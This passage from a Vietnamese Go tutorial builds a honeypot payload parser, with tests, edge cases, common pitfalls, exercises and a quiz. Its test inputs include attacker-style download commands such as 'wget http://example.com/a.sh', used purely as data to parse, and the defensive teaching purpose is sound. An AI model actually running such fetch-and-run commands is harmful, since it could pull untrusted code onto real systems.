	command, ok := parser.ParseCommand(string(payload))
	if !ok {
		return parsedEvent{}, false
	}

	event := parsedEvent{
		IP:      input.IP,
		Payload: payload,
		Command: command.Name,
		Args:    command.Args,
		Count:   counts.Add(input.IP),
	}

	if targetURL, found := parser.ExtractURL(command); found {
		event.URL = targetURL
	}

	return event, true
}
```

Chạy chương trình:

```powershell
go run ./cmd/payloadlab
```

Quyết định thiết kế của ví dụ: chỉ đếm event có IP và command hợp lệ. Trong honeypot thật, bạn có thể đếm mọi kết nối kể cả payload rỗng. Quan trọng là định nghĩa “event” rõ ràng và test đúng định nghĩa đó.

---

## 18. Viết test cho parser

Tạo `internal/parser/parser_test.go`:

```go
package parser

import (
	"reflect"
	"testing"
)

func TestParseCommand(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		want      Command
		wantValid bool
	}{
		{
			name:      "wget with URL",
			input:     "wget http://example.com/a.sh",
			want:      Command{Name: "wget", Args: []string{"http://example.com/a.sh"}},
			wantValid: true,
		},
		{
			name:      "extra whitespace",
			input:     "  \t wget   http://example.com/a.sh \r\n",
			want:      Command{Name: "wget", Args: []string{"http://example.com/a.sh"}},
			wantValid: true,
		},
		{
			name:      "command without arguments",
			input:     "whoami",
			want:      Command{Name: "whoami", Args: []string{}},
			wantValid: true,
		},
		{
			name:      "empty input",
			input:     "",
			want:      Command{},
			wantValid: false,
		},
		{
			name:      "whitespace only",
			input:     " \t\r\n",
			want:      Command{},
			wantValid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, valid := ParseCommand(tt.input)

			if valid != tt.wantValid {
				t.Fatalf("valid=%v, want %v", valid, tt.wantValid)
			}

			if !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("got %#v, want %#v", got, tt.want)
			}
		})
	}
}

func TestExtractURL(t *testing.T) {
	tests := []struct {
		name      string
		command   Command
		wantURL   string
		wantFound bool
	}{
		{
			name:      "HTTP URL",
			command:   Command{Name: "wget", Args: []string{"http://example.com/a.sh"}},
			wantURL:   "http://example.com/a.sh",
			wantFound: true,
		},
		{
			name:      "HTTPS URL after option",
			command:   Command{Name: "curl", Args: []string{"-L", "https://example.com/a"}},
			wantURL:   "https://example.com/a",
			wantFound: true,
		},
		{
			name:      "no URL",
			command:   Command{Name: "whoami"},
			wantFound: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotURL, found := ExtractURL(tt.command)

			if found != tt.wantFound {
				t.Fatalf("found=%v, want %v", found, tt.wantFound)
			}

			if gotURL != tt.wantURL {
				t.Fatalf("URL=%q, want %q", gotURL, tt.wantURL)
			}
		})
	}
}

func TestClonePayload(t *testing.T) {
	original := []byte("attack")
	cloned := ClonePayload(original)

	original[0] = 'X'

	if string(cloned) != "attack" {
		t.Fatalf("clone changed after source mutation: %q", cloned)
	}
}

func TestClonePayloadNil(t *testing.T) {
	if got := ClonePayload(nil); got != nil {
		t.Fatalf("ClonePayload(nil)=%v, want nil", got)
	}
}
```

---

## 19. Viết test cho counter

Tạo `internal/counter/counter_test.go`:

```go
package counter

import "testing"

func TestEventCounter(t *testing.T) {
	counter := New()

	if got := counter.Add("192.0.2.10"); got != 1 {
		t.Fatalf("first Add()=%d, want 1", got)
	}

	if got := counter.Add("192.0.2.10"); got != 2 {
		t.Fatalf("second Add()=%d, want 2", got)
	}

	got, exists := counter.Count("192.0.2.10")
	if !exists || got != 2 {
		t.Fatalf("Count()=(%d, %v), want (2, true)", got, exists)
	}
}

func TestEventCounterMissingIP(t *testing.T) {
	counter := New()

	got, exists := counter.Count("203.0.113.7")
	if exists || got != 0 {
		t.Fatalf("Count()=(%d, %v), want (0, false)", got, exists)
	}
}

func TestEventCounterEmptyIP(t *testing.T) {
	counter := New()

	if got := counter.Add(""); got != 0 {
		t.Fatalf("Add(empty)=%d, want 0", got)
	}

	if _, exists := counter.Count(""); exists {
		t.Fatal("empty IP should not be stored")
	}
}
```

Chạy:

```powershell
go test ./...
```

---

## 20. Trường hợp biên bắt buộc

Parser phải được thử với ít nhất các input sau:

```text
""
"   "
"wget"
"wget     http://example.com/a.sh"
"\twget\thttp://example.com/a.sh\r\n"
"wget ftp://example.com/a.sh"
"curl -L https://example.com/a"
"echo Việt Nam"
```

Payload và map cần kiểm tra thêm:

- `nil` payload.
- `[]byte{}`.
- IP rỗng.
- IP chưa tồn tại trong map.
- Command không có argument.
- Command có argument nhưng không có URL.
- Nhiều URL; parser hiện trả URL đầu tiên.
- Payload chứa UTF-8 không hợp lệ.
- Sửa buffer gốc sau khi clone; payload đã clone phải không đổi.
- Slice chỉ dài vài byte nhưng được cắt từ backing array rất lớn.

Tiêu chí quan trọng nhất: mọi input bất thường phải trả kết quả có kiểm soát, không panic.

---

## 21. Quy trình kiểm tra

Chạy từ `C:\Go_project\go_day2`:

```powershell
go fmt ./...
go test ./...
go vet ./...
go build ./...
go run ./cmd/payloadlab
```

Khi bắt đầu dùng goroutine, chạy thêm race detector:

```powershell
go test -race ./...
```

Race detector không thay thế test logic. Nó tìm các lần truy cập bộ nhớ đồng thời không được đồng bộ khi đường chạy đó thực sự được test thực thi.

---

## 22. Các lỗi thường gặp

### `index out of range`

Nguyên nhân thường là truy cập `fields[0]`, `payload[0]` hoặc `packet[:n]` trước khi kiểm tra độ dài.

Quy tắc:

```go
if len(fields) == 0 {
	return Command{}, false
}
```

### `assignment to entry in nil map`

Map chưa được khởi tạo:

```go
var counts map[string]int
counts[ip]++
```

Sửa bằng:

```go
counts := make(map[string]int)
```

### Clone nhưng dữ liệu vẫn thay đổi

Đoạn sau không clone:

```go
cloned := payload[:]
```

Nó chỉ tạo slice header mới trỏ đến cùng backing array. Dùng `make` và `copy`.

### Hiểu sai `len(string)`

`len("Việt")` không trả số chữ hiển thị. Nó trả số byte của biểu diễn UTF-8.

### Bỏ qua lỗi `strconv`

Không viết:

```go
port, _ := strconv.Atoi(input)
```

Attacker kiểm soát input. Nếu parse lỗi mà bỏ qua `err`, `port` nhận zero value và có thể bị hiểu sai là dữ liệu hợp lệ.

### Cho rằng một lần `Read` là một packet hoàn chỉnh

TCP là byte stream. Một command có thể bị chia qua nhiều lần `Read`, hoặc nhiều command có thể đến trong một lần `Read`. Hôm nay chưa xây frame parser, nhưng không được hình thành giả định sai này.

### Dùng `strings.Fields` như shell parser hoàn chỉnh

`strings.Fields` không xử lý quote, escape, biến môi trường hay pipe. Parser đơn giản chỉ phù hợp với mục tiêu bài tập và phân tích sơ bộ.

---

## 23. Bài tập mở rộng

### Bài 1 — Validate URL bằng `net/url`

Viết:

```go
func ExtractValidURL(command Command) (string, bool)
```

Chỉ chấp nhận:

- Scheme là `http` hoặc `https`.
- Host không rỗng.

Không thực hiện request đến URL. Honeypot chỉ phân tích dữ liệu, không tải payload của attacker trong bài này.

### Bài 2 — Giới hạn kích thước payload lưu trữ

Viết:

```go
func ClonePayloadLimit(payload []byte, limit int) ([]byte, bool)
```

Quy ước:

- `limit <= 0`: trả slice rỗng hoặc nil theo thiết kế bạn chọn và ghi rõ bằng test.
- Nếu payload dài hơn limit, chỉ clone `limit` byte đầu và trả `truncated=true`.
- Không slice ngoài phạm vi.

### Bài 3 — Đếm command

Dùng map thứ hai để có kết quả:

```text
wget:   5
curl:   3
whoami: 2
```

Chuẩn hóa command bằng `strings.ToLower` trước khi đếm.

### Bài 4 — Kiểm tra UTF-8

Dùng `utf8.Valid` để thêm field:

```go
ValidUTF8 bool
```

Payload không hợp lệ vẫn phải được lưu dưới dạng byte. Không vứt evidence chỉ vì không chuyển được thành text sạch.

### Bài 5 — Phân biệt nil và empty slice

Thử:

```go
var nilSlice []byte
emptySlice := []byte{}

fmt.Println(nilSlice == nil)
fmt.Println(emptySlice == nil)
fmt.Println(len(nilSlice), len(emptySlice))
```

Cả hai đều có `len == 0`, nhưng chỉ `nilSlice` bằng `nil`. Giải thích khi nào sự khác biệt này có thể xuất hiện trong JSON hoặc API contract.

---

## 24. Checklist hoàn thành Day 2

- [ ] Phân biệt được array và slice.
- [ ] Giải thích được slice dùng backing array.
- [ ] Hiểu sự khác nhau giữa `len` và `cap`.
- [ ] Biết `append` có thể cấp phát backing array mới.
- [ ] Biết append vào subslice có thể ghi vào backing array cũ.
- [ ] Không truy cập `slice[0]` trước khi kiểm tra độ dài.
- [ ] Không dùng dữ liệu attacker làm slice bound trước khi validate.
- [ ] Dùng `make` và `copy` để clone payload.
- [ ] Giải thích được vì sao subslice nhỏ có thể giữ lại buffer lớn.
- [ ] Khởi tạo map trước khi ghi.
- [ ] Dùng `value, exists := m[key]` để kiểm tra key.
- [ ] Parse được `wget http://example.com/a.sh` thành command và arguments.
- [ ] Trích được URL HTTP/HTTPS đầu tiên.
- [ ] Đếm được số event theo IP.
- [ ] Xử lý được input rỗng mà không panic.
- [ ] Phân biệt được `string`, `[]byte` và `[]rune`.
- [ ] Giải thích được `len(string)` đếm byte, không đếm ký tự hiển thị.
- [ ] Biết một ký tự hiển thị có thể gồm nhiều rune.
- [ ] Dùng được `strings`, `bytes` và `strconv`.
- [ ] `go test ./...` chạy thành công.
- [ ] `go vet ./...` chạy thành công.
- [ ] `go build ./...` chạy thành công.

---

## 25. Câu hỏi tự kiểm tra

1. `[8]byte` khác `[]byte` như thế nào?
2. `len(slice)` và `cap(slice)` biểu diễn điều gì?
3. Vì sao phải gán lại kết quả của `append`?
4. Khi nào `append` có thể ảnh hưởng slice khác?
5. Vì sao `payload := buffer[:20]` có thể giữ lại buffer 1 MiB?
6. `payload[:]` có phải một bản sao độc lập không?
7. Vì sao đọc key không tồn tại trong `map[string]int` trả về `0`?
8. Làm sao phân biệt key không tồn tại với key có giá trị `0`?
9. Có thể đọc nil map không? Có thể ghi nil map không?
10. `len("Việt")` đo đại lượng gì?
11. `[]rune` giải quyết được điều gì và chưa giải quyết được điều gì?
12. Vì sao payload mạng nên được giữ dưới dạng `[]byte` gốc?
13. `strings.Fields("")` trả gì và cần kiểm tra thế nào?
14. Vì sao không nên dùng shell thật để parse command attacker gửi?
15. Vì sao không được giả định một lần TCP `Read` trả một command hoàn chỉnh?

### Đáp án ngắn

1. Array có độ dài cố định thuộc về kiểu; slice là view động lên backing array.
2. `len` là số phần tử được truy cập; `cap` là khả năng mở rộng từ vị trí bắt đầu của slice.
3. `append` có thể trả slice header mới trỏ tới backing array mới.
4. Khi các slice chia sẻ backing array và append vẫn còn đủ capacity trong array đó.
5. Subslice vẫn chứa tham chiếu đến backing array lớn.
6. Không; nó vẫn chia sẻ backing array. Phải dùng `copy` hoặc phương thức clone tương đương.
7. Đọc key không tồn tại trả zero value của value type; zero value của `int` là `0`.
8. Dùng comma-ok: `value, exists := m[key]`.
9. Có thể đọc nil map; ghi vào nil map sẽ panic.
10. Số byte trong string.
11. Nó cho phép làm việc theo Unicode code point, nhưng một grapheme hiển thị vẫn có thể gồm nhiều rune.
12. Dữ liệu có thể không phải UTF-8 hợp lệ và byte gốc là evidence chính xác nhất.
13. Slice rỗng; kiểm tra `len(fields) == 0` trước `fields[0]`.
14. Shell có thể thực thi input độc hại; parser bài này chỉ phân tích text.
15. TCP là byte stream, không bảo toàn ranh giới message của ứng dụng.

---

## 26. Definition of Done

Day 2 hoàn thành khi bạn tự chạy được chuỗi lệnh sau từ `C:\Go_project\go_day2`:

```powershell
go fmt ./...
go test ./...
go vet ./...
go build ./...
go run ./cmd/payloadlab
```

Ngoài việc code chạy, bạn phải tự chứng minh được ba điều:

1. Input `""` và `"   "` không làm parser panic.
2. Sửa buffer gốc sau `ClonePayload` không làm payload đã clone thay đổi.
3. `len("Việt")`, số rune và số ký tự hiển thị có thể là ba khái niệm khác nhau.

Khi hoàn thành, bạn đã có nền tảng trực tiếp cho protocol server: nhận byte, quản lý buffer, parse dữ liệu không tin cậy và lưu event mà không giữ tham chiếu bộ nhớ ngoài ý muốn.
